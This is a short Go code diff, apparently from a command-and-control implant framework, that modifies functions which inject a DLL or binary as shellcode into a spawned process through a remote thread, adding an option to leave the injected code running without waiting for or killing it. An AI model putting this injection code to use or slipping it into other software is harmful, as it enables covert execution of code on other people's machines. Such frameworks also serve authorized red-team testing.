@@ -225,7 +225,7 @@ func ExecuteAssembly(data []byte, process string) (string, error) {
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
 
-func SpawnDll(procName string, data []byte, offset uint32, args string) (string, error) {
+func SpawnDll(procName string, data []byte, offset uint32, args string, kill bool) (string, error) {
 	err := refresh()
 	if err != nil {
 		return "", err
@@ -270,17 +270,20 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
 	// {{end}}
 
-	err = waitForCompletion(threadHandle)
-	if err != nil {
-		return "", err
+	if kill {
+		err = waitForCompletion(threadHandle)
+		if err != nil {
+			return "", err
+		}
+		cmd.Process.Kill()
+		return stdoutBuff.String() + stderrBuff.String(), nil
 	}
-	cmd.Process.Kill()
-	return stdoutBuff.String() + stderrBuff.String(), nil
+	return "", nil
 }
 
 //SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, data []byte, args string) (string, error) {
-	return SpawnDll(procName, data, 0, "")
+func Sideload(procName string, data []byte, args string, kill bool) (string, error) {
+	return SpawnDll(procName, data, 0, "", kill)
 }
 
 // Util functions
